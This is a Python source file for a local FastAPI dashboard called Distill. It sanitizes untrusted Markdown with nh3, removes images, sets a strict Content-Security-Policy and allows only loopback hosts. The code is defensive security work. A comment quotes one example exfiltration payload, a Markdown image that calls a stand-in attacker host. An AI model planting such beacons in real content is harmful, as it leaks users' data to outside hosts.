"""Distill local web server: read-only dashboard over the file-based library."""

import ipaddress
import threading
import webbrowser
from pathlib import Path

import uvicorn
from fastapi import FastAPI, Request
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from starlette.middleware.base import RequestResponseEndpoint
from starlette.responses import PlainTextResponse, Response

from distill.cli_shared import duration_str, format_date, strip_frontmatter
from distill.config import DistillConfig
from distill.parsing import parse_ascii_uint
from distill.pipeline.dashboard_data import format_run_timestamp

WEB_DIR = Path(__file__).parent


def create_app(config: DistillConfig) -> FastAPI:
    app = FastAPI(title="Distill", docs_url=None, redoc_url=None)
    app.state.config = config

    app.mount("/static", StaticFiles(directory=WEB_DIR / "static"), name="static")

    templates = Jinja2Templates(directory=WEB_DIR / "templates")

    # Register template filters.
    #
    # Artifact bodies are derived from untrusted ingested sources (a malicious
    # page or transcript could carry raw HTML, or an LLM could echo an injected
    # ``<script>`` into an insight). Templates render this through ``|markdown|
    # safe``, so the rendered HTML MUST be sanitized first -- otherwise it is a
    # stored-XSS vector in the dashboard. Sanitize the rendered output with nh3
    # (allowlist), per Python-Markdown's own guidance to sanitize output rather
    # than trust the renderer. If a sanitizer or renderer is unavailable, fail
    # safe by escaping everything.
    def _escape_all(text: str) -> str:
        escaped = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        return f"<pre>{escaped}</pre>"

    try:
        import markdown as md_lib
        import nh3

        def md_filter(text: str) -> str:
            html = md_lib.markdown(text, extensions=["tables", "fenced_code"])
            # Drop <img>: an injected `![](http://attacker/leak?d=...)` in
            # ingested content would otherwise survive nh3 and auto-load on page
            # view -- a zero-click exfiltration beacon. Also restrict link
            # schemes and mark links noopener/nofollow. nh3 already strips
            # scripts and event handlers.
            return nh3.clean(
                html,
                tags=nh3.ALLOWED_TAGS - {"img"},
                url_schemes={"http", "https", "mailto"},
                link_rel="noopener noreferrer nofollow",
            )

    except ImportError:
        md_filter = _escape_all

    templates.env.filters["markdown"] = md_filter
    templates.env.filters["format_date"] = format_date
    templates.env.filters["duration"] = duration_str
    templates.env.filters["format_timestamp"] = format_run_timestamp
    templates.env.filters["strip_frontmatter"] = strip_frontmatter
    templates.env.globals["asset_version"] = str(
        (WEB_DIR / "static" / "style.css").stat().st_mtime_ns
    )
    templates.env.globals["script_version"] = str(
        (WEB_DIR / "static" / "app.js").stat().st_mtime_ns
    )

    app.state.templates = templates

    @app.middleware("http")
    async def _security_headers(request: Request, call_next: RequestResponseEndpoint) -> Response:
        # Defense-in-depth for the dashboard, which renders untrusted ingested
        # content: block external images/connections (exfil beacons) even if the
        # sanitizer regresses. Inline styles remain for legacy presentation, but
        # executable JavaScript must come from a same-origin static asset.
        if not _is_loopback_host_header(request.headers.get("host", "")):
            response = PlainTextResponse("Invalid host header", status_code=400)
        else:
            response = await call_next(request)
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; img-src 'self'; "
            "style-src 'self' 'unsafe-inline'; script-src 'self'; "
            "object-src 'none'; base-uri 'none'; form-action 'self'; "
            "frame-ancestors 'none'"
        )
        response.headers["Referrer-Policy"] = "no-referrer"
        return response

    from distill.web.routes import channels, costs, dashboard, topics, videos, watchlist

    app.include_router(dashboard.router)
    app.include_router(topics.router)
    app.include_router(channels.router)
    app.include_router(videos.router)
    app.include_router(costs.router)
    app.include_router(watchlist.router)

    return app


def _is_loopback_host(host: str) -> bool:
    normalized = host.strip().removeprefix("[").removesuffix("]")
    if normalized.casefold() == "localhost":
        return True
    try:
        return ipaddress.ip_address(normalized).is_loopback
    except ValueError:
        return False


def _split_host_header(value: str) -> tuple[str, str | None] | None:
    """Parse a conservative host and optional port from an HTTP authority."""
    if not value or value != value.strip() or any(char in value for char in "\r\n\t /\\@,#?"):
        return None
    if value.startswith("["):
        closing_bracket = value.find("]")
        if closing_bracket <= 1:
            return None
        host = value[1:closing_bracket]
        port_suffix = value[closing_bracket + 1 :]
        if "]" in port_suffix or (port_suffix and not port_suffix.startswith(":")):
            return None
        return host, port_suffix[1:] if port_suffix else None
    if value.count(":") > 1:
        return None
    host, separator, raw_port = value.partition(":")
    return host, raw_port if separator else None


def _is_loopback_host_header(value: str) -> bool:
    """Validate an HTTP Host header without resolving attacker-owned names."""

    parsed = _split_host_header(value)
    if parsed is None:
        return False
    host, raw_port = parsed
    port = parse_ascii_uint(raw_port) if raw_port is not None else None
    if raw_port is not None and (port is None or not 1 <= port <= 65535):
        return False
    if "%" in host:
        return False
    return _is_loopback_host(host)


def _normalize_loopback_host(host: str) -> tuple[str, str]:
    """Return socket-bind and URL forms for a validated loopback host."""
    bind_host = host.strip().removeprefix("[").removesuffix("]")
    if not _is_loopback_host(bind_host):
        raise ValueError(
            "The dashboard supports loopback bindings only; remote access requires authentication."
        )
    browser_host = f"[{bind_host}]" if ":" in bind_host else bind_host
    return bind_host, browser_host


def run_server(config: DistillConfig, host: str, port: int, open_browser: bool):
    if type(port) is not int or not 1 <= port <= 65535:
        raise ValueError("dashboard port must be an integer between 1 and 65535")
    bind_host, browser_host = _normalize_loopback_host(host)
    app = create_app(config)
    if open_browser:
        threading.Timer(1.0, lambda: webbrowser.open(f"http://{browser_host}:{port}")).start()
    uvicorn.run(app, host=bind_host, port=port, log_level="warning")
